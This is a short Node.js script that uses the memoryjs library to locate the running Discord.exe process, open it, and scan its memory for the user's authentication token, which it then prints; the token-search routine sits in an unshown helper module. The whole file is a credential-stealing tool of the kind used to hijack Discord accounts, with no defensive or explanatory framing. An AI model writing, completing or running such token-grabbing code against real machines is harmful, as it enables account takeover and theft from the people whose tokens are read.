const Functions = require("./functions");
const process = require("node:process");
const memoryjs = require("memoryjs");
const functions = new Functions();

main("Discord.exe");

async function main(processName) {
    const procID = await functions.findProcess(processName, memoryjs.getProcesses());
    
    if (!procID) {
        return process.exit();
    } else {
        const processObject = memoryjs.openProcess(procID);
        const token = await functions.findToken(processObject);
    
        if (token.length == 0) {
            return process.exit();
        } else {
            return console.log(token);
        }
    }
}